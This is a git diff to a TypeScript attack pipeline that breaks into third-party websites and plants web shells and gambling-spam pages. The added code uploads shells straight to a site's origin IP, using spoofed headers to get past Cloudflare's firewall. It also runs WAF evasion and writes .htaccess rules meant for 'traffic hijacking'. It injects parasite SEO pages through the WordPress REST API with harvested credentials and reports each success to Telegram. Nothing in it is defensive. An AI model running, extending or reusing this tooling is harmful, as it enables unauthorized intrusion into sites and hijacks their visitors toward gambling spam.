@@ -22,7 +22,7 @@ import { runAllDnsAttacks as runDnsAttacks, type DnsAttackResult, type DnsAttack
 import { runAllConfigExploits as runConfigExploits, type ConfigExploitResult, type ConfigExploitConfig } from "./config-exploitation";
 import { generateCloakingPackage, type CloakingConfig, type CloakingShell as CloakingShellResult } from "./cloaking-shell-generator";
 import { generateContentPack, type ContentConfig, type ContentPack } from "./cloaking-content-engine";
-import { generateParasiteSeoBundle, type ParasiteSeoPayload } from "./parasite-seo-injector";
+import { generateParasiteSeoBundle, injectViaWpRestApi, getWpParasiteUploadPaths, generateWpHtaccessRedirect, type ParasiteSeoPayload, type WpRestInjectionResult } from "./parasite-seo-injector";
 import { executeInjection, type InjectionConfig, type InjectionResult } from "./php-injector";
 import { uploadContentToCdn, type CdnUploadResult } from "./content-cdn";
 import { sendTelegramNotification, sendVulnAlert, sendAttackSuccessAlert, sendFailureSummaryAlert, type TelegramNotification, type MethodAttempt } from "./telegram-notifier";
@@ -34,7 +34,8 @@ import { runShelllessAttacks, type ShelllessResult, type ShelllessConfig } from 
 import { runAiCommander, type AiCommanderResult, type AiCommanderEvent } from "./ai-autonomous-engine";
 import { runNonWpExploits, type NonWpScanResult, type ExploitResult } from "./non-wp-exploits";
 import { runComprehensiveAttackVectors, type AttackVectorResult, type AttackVectorConfig } from "./comprehensive-attack-vectors";
-import { findOriginIP, type OriginIPResult } from "./cf-origin-bypass";
+import { findOriginIP, fetchViaOriginIP, type OriginIPResult } from "./cf-origin-bypass";
+import { runCfBypass, fetchWithCfBypass, generateEvasionVariants, type CfBypassResult } from "./cf-bypass";
 import { wpBruteForce, wpAuthenticatedUpload, type BruteForceResult, type WPCredentials } from "./wp-brute-force";
 import { createAttackLogger, type AttackLogger } from "./attack-logger";
 import { buildTargetProfile, shouldSkipUploads, generateFallbackPlan, getOptimalRetryCount, formatFallbackPlan, type TargetProfile, type FallbackPlan } from "./smart-fallback";
@@ -47,6 +48,7 @@ import { trackExploitAttempt, trackWafDetection, extractDomain } from "./exploit
 import { selectBypassTechniques, notifyWafBypassSuccess } from "./waf-bypass-strategies";
 import { executeBreachHunt, type BreachHuntResult, type BreachCredential } from "./breach-db-hunter";
 import { runGenericUploadEngine, type GenericUploadResult, type GenericUploadReport, type GenericUploadConfig } from "./generic-upload-engine";
+import { recordMethodResult } from "./attack-method-tracker";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -89,6 +91,8 @@ export interface PipelineConfig {
   userId?: number;
   // Global pipeline timeout (ms) — default 20 minutes
   globalTimeout?: number;
+  // Pre-discovered origin IP (bypass WAF from the start)
+  originIp?: string;
 }
 
 export interface PipelineEvent {
@@ -374,7 +378,7 @@ async function verifyUploadedFile(
           signal: AbortSignal.timeout(10000),
         }, { targetDomain: vfDomain, timeout: 10000 });
         const body = await bodyResp.text();
-        const hasJsRedirect = body.includes("window.location") || body.includes("location.replace") || body.includes("location.href");
+        const hasJsRedirect = body.includes("window.location") || body.includes("location.replace") || body.includes("location.href") || body.includes("atob(");
         const hasMetaRedirect = body.includes('http-equiv="refresh"') || body.includes("http-equiv='refresh'");
 
         if (hasJsRedirect || hasMetaRedirect) {
@@ -389,6 +393,15 @@ async function verifyUploadedFile(
           if (!extractedTarget) {
             const jsMatch = body.match(/(?:window\.location|location\.(?:href|replace))\s*[=(]\s*["']([^"']+)["']/i);
             if (jsMatch) extractedTarget = jsMatch[1];
+          }
+          // Try atob-encoded redirect: var _r=atob("base64..."); ... location.replace(_r)
+          if (!extractedTarget) {
+            const atobMatch = body.match(/atob\(["']([A-Za-z0-9+/=]+)["']\)/);
+            if (atobMatch) {
+              try {
+                extractedTarget = Buffer.from(atobMatch[1], "base64").toString("utf-8");
+              } catch { /* ignore decode error */ }
+            }
           }
 
           if (extractedTarget) {
@@ -549,6 +562,7 @@ async function uploadShellWithAllMethods(
   config: PipelineConfig,
   onEvent: EventCallback,
   deadline?: number,
+  originIp?: string,
 ): Promise<{ success: boolean; url: string; method: string }> {
   const fileContent = typeof shell.content === "string" ? shell.content : shell.content.toString("base64");
   const baseTimeout = config.timeoutPerMethod || 30000;
@@ -561,13 +575,110 @@ async function uploadShellWithAllMethods(
   const timeout = getMethodTimeout(); // initial timeout for method 1
   // Helper: check if we've exceeded the pipeline deadline
   const isExpired = () => deadline ? Date.now() > deadline : false;
+  // When origin IP is available, build a direct URL that bypasses CF
+  const domain = (() => { try { return new URL(targetUrl).hostname; } catch { return ""; } })();
+  const originTargetUrl = originIp ? `http://${originIp}` : targetUrl;
+  const originHeaders: Record<string, string> = originIp ? { "Host": domain, "X-Forwarded-For": "1.1.1.1", "X-Real-IP": "1.1.1.1" } : {};
 
   onEvent({
     phase: "upload",
     step: "method_plan",
-    detail: `📋 Upload plan: ${enabledMethods.length} methods enabled — ${enabledMethods.map(m => METHOD_REGISTRY[m] || m).join(" → ")}${proxyUrl ? " (via proxy)" : ""}`,
+    detail: `📋 Upload plan: ${enabledMethods.length} methods enabled — ${enabledMethods.map(m => METHOD_REGISTRY[m] || m).join(" → ")}${proxyUrl ? " (via proxy)" : ""}${originIp ? ` 🎯 Origin IP: ${originIp}` : ""}`,
     progress: 10,
   });
+
+  // ═══ Method 0: Direct-to-Origin Upload (bypass Cloudflare WAF entirely) ═══
+  if (originIp && !isExpired()) {
+    onEvent({
+      phase: "upload",
+      step: "origin_direct",
+      detail: `🎯 Method 0: Direct-to-Origin Upload — bypassing CF WAF via ${originIp}`,
+      progress: 5,
+    });
+
+    // Build upload paths
+    const scanPaths = vulnScan?.writablePaths?.length ? vulnScan.writablePaths.map(w => w.path) : null;
+    const prescreenPaths = prescreen?.writablePaths?.length ? prescreen.writablePaths : null;
+    const uploadPaths = scanPaths || prescreenPaths || [
+      "/wp-content/uploads/", "/uploads/", "/images/",
+      "/wp-content/themes/", "/tmp/", "/media/",
+      "/wp-content/plugins/", "/wp-includes/",
+    ];
+
+    for (const path of uploadPaths.slice(0, 6)) {
+      if (isExpired()) break;
+      const uploadUrl = `http://${originIp}${path}${shell.filename}`;
+      const verifyUrl = `${targetUrl.replace(/\/$/, "")}${path}${shell.filename}`;
+
+      try {
+        // Try PUT directly to origin IP with Host header
+        const putRes = await Promise.race([
+          fetchWithPoolProxy(uploadUrl, {
+            method: "PUT",
+            body: fileContent,
+            headers: {
+              ...originHeaders,
+              "Content-Type": shell.filename.endsWith(".php") ? "application/x-httpd-php" : "text/html",
+            },
+            signal: AbortSignal.timeout(timeout),
+          }, { targetDomain: originIp, timeout }),
+          new Promise<never>((_, reject) => setTimeout(() => reject(new Error("origin PUT timeout")), timeout)),
+        ]);
+
+        if (putRes.response.status < 400) {
+          onEvent({
+            phase: "upload",
+            step: "origin_direct_success",
+            detail: `✅ Origin PUT สำเร็จ (HTTP ${putRes.response.status}): ${verifyUrl}`,
+            progress: 8,
+          });
+          return { success: true, url: verifyUrl, method: "origin_direct_put" };
+        }
+      } catch (e: any) {
+        // Try multipart form upload to origin
+        try {
+          const boundary = `----WebKitFormBoundary${Math.random().toString(36).slice(2)}`;
+          const multipartBody = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${shell.filename}"\r\nContent-Type: application/octet-stream\r\n\r\n${fileContent}\r\n--${boundary}--`;
+          const formRes = await Promise.race([
+            fetchWithPoolProxy(uploadUrl.replace(shell.filename, ""), {
+              method: "POST",
+              body: multipartBody,
+              headers: {
+                ...originHeaders,
+                "Content-Type": `multipart/form-data; boundary=${boundary}`,
+              },
+              signal: AbortSignal.timeout(timeout),
+            }, { targetDomain: originIp, timeout }),
+            new Promise<never>((_, reject) => setTimeout(() => reject(new Error("origin POST timeout")), timeout)),
+          ]);
+
+          if (formRes.response.status < 400) {
+            onEvent({
+              phase: "upload",
+              step: "origin_direct_success",
+              detail: `✅ Origin POST สำเร็จ (HTTP ${formRes.response.status}): ${verifyUrl}`,
+              progress: 8,
+            });
+            return { success: true, url: verifyUrl, method: "origin_direct_post" };
+          }
+        } catch { /* continue to next path */ }
+      }
+
+      onEvent({
+        phase: "upload",
+        step: "origin_direct_fail",
+        detail: `⚠️ Origin direct upload ล้มเหลวที่ ${path} — ลอง path ถัดไป`,
+        progress: 6,
+      });
+    }
+
+    onEvent({
+      phase: "upload",
+      step: "origin_direct_done",
+      detail: `⚠️ Method 0: Origin direct upload ทุก path ล้มเหลว — fallback to standard methods`,
+      progress: 9,
+    });
+  }
 
   // Method 1: oneClickDeploy (full pipeline)
   if (!enabledMethods.includes("oneclick") && enabledMethods.length > 0) {
@@ -600,7 +711,7 @@ async function uploadShellWithAllMethods(
     };
 
     const result: DeployResult = await Promise.race([
-      oneClickDeploy(targetUrl, config.redirectUrl, deployOpts),
+      oneClickDeploy(originIp ? originTargetUrl : targetUrl, config.redirectUrl, deployOpts),
       new Promise<DeployResult>((_, reject) => setTimeout(() => reject(new Error("oneClickDeploy timeout")), Math.min(timeout + 15000, getRemainingMs()))),
     ]);
 
@@ -639,7 +750,7 @@ async function uploadShellWithAllMethods(
     try {
       const results: UploadAttemptResult[] = await Promise.race([
         tryAllUploadMethods(
-          targetUrl,
+          originIp ? originTargetUrl : targetUrl,
           prescreen,
           fileContent,
           shell.filename,
@@ -699,12 +810,14 @@ async function uploadShellWithAllMethods(
       "/public/uploads/", "/content/images/", "/data/", "/backup/",
     ];
     const parallelConfig: ParallelUploadConfig = {
-      targetUrl,
+      targetUrl: originIp ? originTargetUrl : targetUrl,
       fileContent,
       fileName: shell.filename,
       uploadPaths,
       prescreen,
       timeout,
+      originIp,
+      originalDomain: domain,
       onMethodProgress: (method, status) => {
         onEvent({
           phase: "upload",
@@ -761,12 +874,14 @@ async function uploadShellWithAllMethods(
       "/assets/", "/cache/", "/files/",
     ];
     const retryConfig: ParallelUploadConfig = {
-      targetUrl,
+      targetUrl: originIp ? originTargetUrl : targetUrl,
       fileContent,
       fileName: shell.filename,
       uploadPaths,
       prescreen,
       timeout: timeout + 10000,
+      originIp,
+      originalDomain: domain,
       onMethodProgress: (method, status) => {
         onEvent({
           phase: "upload",
@@ -1030,7 +1145,7 @@ export async function runUnifiedAttackPipeline(
           detail: `🔬 ${detail}`,
           progress: 20 + (progress / 100) * 15,
         });
-      }),
+      }, undefined, config.originIp),
       new Promise<VulnScanResult>((_, reject) => setTimeout(() => reject(new Error("vuln scan timeout")), 65000)), // 65s — slightly more than scanner's 60s FULL_SCAN_TIMEOUT
     ]);
 
@@ -1340,6 +1455,61 @@ export async function runUnifiedAttackPipeline(
         detail: `⚠️ CF Bypass ล้มเหลว: ${error.message}`,
         progress: 43,
       });
+    }
+  }
+
+  // ─── Phase 2.5c2: Unified CF Bypass (Header Manipulation + Cache + WAF Evasion) ───
+  let unifiedCfBypassResult: CfBypassResult | null = null;
+  const hasAnyWaf = !!(wafDetected || wafDetectionResult?.detected);
+
+  if (hasAnyWaf && !originIp && !shouldStop('unified_cf_bypass')) {
+    try {
+      loggedOnEvent({
+        phase: "cf_bypass",
+        step: "unified_start",
+        detail: "☁️ Phase 2.5c2: Unified CF Bypass — Header Manipulation, Cache Bypass, WAF Evasion, Parameter Pollution...",
+        progress: 43,
+      });
+
+      unifiedCfBypassResult = await Promise.race([
+        runCfBypass({
+          targetUrl: config.targetUrl,
+          timeout: 60000,
+          enableOriginDiscovery: !cfBypassResult, // Skip if already tried above
+          enableHeaderManipulation: true,
+          enableCacheBypass: true,
+          enableWafEvasion: true,
+          onProgress: (technique, detail) => {
+            loggedOnEvent({
+              phase: "cf_bypass",
+              step: `unified_${technique}`,
+              detail: `☁️ ${detail}`,
+              progress: 44,
+            });
+          },
+        }),
+        new Promise<CfBypassResult>((_, reject) => setTimeout(() => reject(new Error("Unified CF bypass timeout")), 65000)),
+      ]);
+
+      if (unifiedCfBypassResult.originIp && !originIp) {
+        originIp = unifiedCfBypassResult.originIp;
+        aiDecisions.push(`☁️ Unified CF Bypass: Origin IP ${originIp} found via ${unifiedCfBypassResult.bestTechnique}`);
+      }
+
+      const successTechniques = unifiedCfBypassResult.techniques.filter(t => t.success).map(t => t.name);
+      if (successTechniques.length > 0) {
+        aiDecisions.push(`☁️ Unified CF Bypass: ${successTechniques.length} techniques succeeded — ${successTechniques.join(", ")}`);
+      }
+
+      loggedOnEvent({
+        phase: "cf_bypass",
+        step: "unified_complete",
+        detail: `✅ Unified CF Bypass เสร็จ — ${successTechniques.length}/${unifiedCfBypassResult.techniques.length} techniques succeeded${originIp ? `, Origin IP: ${originIp}` : ""}`,
+        progress: 45,
+        data: { unifiedCfBypassResult },
+      });
+    } catch (error: any) {
+      errors.push(`Unified CF bypass failed: ${error.message}`);
     }
   }
 
@@ -2188,6 +2358,13 @@ export async function runUnifiedAttackPipeline(
     });
     
     aiDecisions.push(`Added ${parasiteShells.length} rich parasite SEO payloads with conditional JS redirect`);
+    
+    // Add WP .htaccess redirect shell (for directory-level redirect)
+    if (isWordPress) {
+      const htaccessShell = generateWpHtaccessRedirect(config.redirectUrl, parasiteKeywords);
+      shells.push(htaccessShell);
+      aiDecisions.push(`Added WP .htaccess redirect shell for directory-level traffic hijacking`);
+    }
   } catch (error: any) {
     // Non-critical — continue with existing shells
     loggedOnEvent({
@@ -2196,6 +2373,78 @@ export async function runUnifiedAttackPipeline(
       detail: `⚠️ Parasite SEO generation failed (non-critical): ${error.message}`,
       progress: 51,
     });
+  }
+
+  // ─── Phase 3.6: WP REST API Content Injection (if WP + credentials) ───
+  if (isWordPress && wpAuthCredentials && !shouldStop('wp_rest_inject') && !hasSuccessfulRedirect()) {
+    try {
+      loggedOnEvent({
+        phase: "upload",
+        step: "wp_rest_inject_start",
+        detail: `🎯 Phase 3.6: WP REST API Injection — สร้าง page/post ผ่าน WP REST API...`,
+        progress: 52,
+      });
+
+      const parasiteKeywords = config.seoKeywords?.length ? config.seoKeywords : ["สล็อตเว็บตรง", "เว็บพนันออนไลน์"];
+
+      // Try creating a page first (more SEO value), then a post
+      for (const asPage of [true, false]) {
+        if (hasSuccessfulRedirect()) break;
+
+        const restResult = await injectViaWpRestApi({
+          targetUrl: config.targetUrl,
+          redirectUrl: config.redirectUrl,
+          keywords: parasiteKeywords,
+          credentials: wpAuthCredentials,
+          asPage,
+        });
+
+        if (restResult.success && restResult.postUrl) {
+          // Verify the injected page
+          const verification = await verifyUploadedFile(restResult.postUrl, config.redirectUrl, onEvent);
+
+          uploadedFiles.push({
+            url: restResult.postUrl,
+            shell: {
+              id: `wp_rest_${restResult.method}_${restResult.postId}`,
+              type: "seo_parasite",
+              filename: `wp-${asPage ? "page" : "post"}-${restResult.postId}`,
+              content: "",
+              contentType: "text/html",
+              description: `WP REST API ${asPage ? "page" : "post"} injection`,
+              targetVector: "wp_rest_api",
+              bypassTechniques: ["wp_rest_api", "authenticated_injection"],
+              redirectUrl: config.redirectUrl,
+              seoKeywords: parasiteKeywords,
+              verificationMethod: "Check if WP page/post redirects correctly",
+            },
+            method: restResult.method,
+            verified: verification.verified,
+            redirectWorks: verification.redirectWorks,
+            redirectDestinationMatch: verification.redirectDestinationMatch,
+            finalDestination: verification.finalDestination,
+            httpStatus: verification.httpStatus,
+            redirectChain: verification.redirectChain,
+          });
+
+          aiDecisions.push(`✅ WP REST API ${asPage ? "page" : "post"} injection: ${restResult.postUrl} (redirect: ${verification.redirectWorks})`);
+
+          if (verification.redirectWorks && verification.redirectDestinationMatch) {
+            loggedOnEvent({
+              phase: "complete",
+              step: "success",
+              detail: `🎉 WP REST API injection สำเร็จ! ${restResult.postUrl} → ${config.redirectUrl}`,
+              progress: 100,
+            });
+            break;
+          }
+        } else {
+          aiDecisions.push(`❌ WP REST API ${asPage ? "page" : "post"} injection failed: ${restResult.error}`);
+        }
+      }
+    } catch (error: any) {
+      errors.push(`WP REST API injection failed: ${error.message}`);
+    }
   }
 
   // ─── Phase 4: Upload (try each shell with all methods) ────
@@ -2215,10 +2464,17 @@ export async function runUnifiedAttackPipeline(
     let phpExecutionFailed = false;
 
     const sortedShells = [...shells].sort((a, b) => {
+      // Priority 1: Parasite SEO shells (rich content + conditional redirect — highest success rate)
+      const aIsParasite = a.id.startsWith("parasite_seo_") || a.type === "seo_parasite";
+      const bIsParasite = b.id.startsWith("parasite_seo_") || b.type === "seo_parasite";
+      if (aIsParasite && !bIsParasite) return -1;
+      if (!aIsParasite && bIsParasite) return 1;
+      // Priority 2: AI-generated shells
       if (a.id.startsWith("ai_") && !b.id.startsWith("ai_")) return -1;
       if (!a.id.startsWith("ai_") && b.id.startsWith("ai_")) return 1;
+      // Priority 3: PHP redirect shells
       if (a.type === "redirect_php" && b.type !== "redirect_php") return -1;
-      if (a.type === "seo_parasite" && b.type !== "seo_parasite") return -1;
+      if (b.type === "redirect_php" && a.type !== "redirect_php") return 1;
       return 0;
     });
 
@@ -2249,6 +2505,7 @@ export async function runUnifiedAttackPipeline(
         progress: 50 + (i / sortedShells.length) * 30,
       });
 
+      const uploadStartTime = Date.now();
       const uploadResult = await uploadShellWithAllMethods(
         config.targetUrl,
         shell,
@@ -2257,7 +2514,20 @@ export async function runUnifiedAttackPipeline(
         config,
         onEvent,
         deadline,
+        originIp,
       );
+      const uploadDurationMs = Date.now() - uploadStartTime;
+
+      // Track method result for stats
+      recordMethodResult({
+        methodId: uploadResult.method || "unknown",
+        cmsType: detectedCms || "unknown",
+        wafType: wafDetectionResult?.wafName || "none",
+        success: uploadResult.success,
+        durationMs: uploadDurationMs,
+        isTimeout: uploadResult.method === "deadline_expired",
+        errorMessage: uploadResult.success ? undefined : `Upload failed for ${shell.filename}`,
+      }).catch(() => {}); // fire-and-forget
 
       if (uploadResult.success && uploadResult.url) {
         // Verify the uploaded file
@@ -2335,6 +2605,7 @@ export async function runUnifiedAttackPipeline(
               config,
               onEvent,
               deadline,
+              originIp,
             );
 
             if (htmlUploadResult.success && htmlUploadResult.url) {
@@ -2375,6 +2646,7 @@ export async function runUnifiedAttackPipeline(
               config,
               onEvent,
               deadline,
+              originIp,
             );
 
             if (htaccessUploadResult.success && htaccessUploadResult.url) {
